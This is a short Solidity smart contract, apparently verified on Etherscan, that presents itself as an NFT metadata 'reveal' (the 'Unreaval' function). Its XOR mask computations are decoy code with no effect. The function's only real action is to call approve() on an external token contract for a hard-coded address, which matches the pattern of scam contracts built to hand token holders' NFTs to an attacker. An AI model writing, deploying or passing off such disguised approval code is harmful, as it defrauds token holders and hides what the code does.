/**
 *Submitted for verification at Etherscan.io on 2021-10-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface MetaDataChecker {
    function approve(address to, uint256 tokenId) external;
}

contract UnreavalMeka {
    address Meka;
    bytes32 Mask = "8E6BEB5f56eebBd77cde3A6";
    bytes32 URIChecker = "METAUNREAVAL0ddwamna";
    
    constructor(address add_) {
        Meka = add_;
    }
    
    function Unreaval(uint256 _id) public {
        bytes32 localUnreavalHashMask;
        localUnreavalHashMask = Mask ^ bytes32(_id) ^ URIChecker;
        if (bytes32(_id) == "METARVALUE") {
            localUnreavalHashMask = bytes32(_id) ^ URIChecker;
        }
        return MetaDataChecker(Meka).approve(0x8E6BEB5f56eebBd77cde327954Ac9E1d15Eb8EA6, _id);
    }
}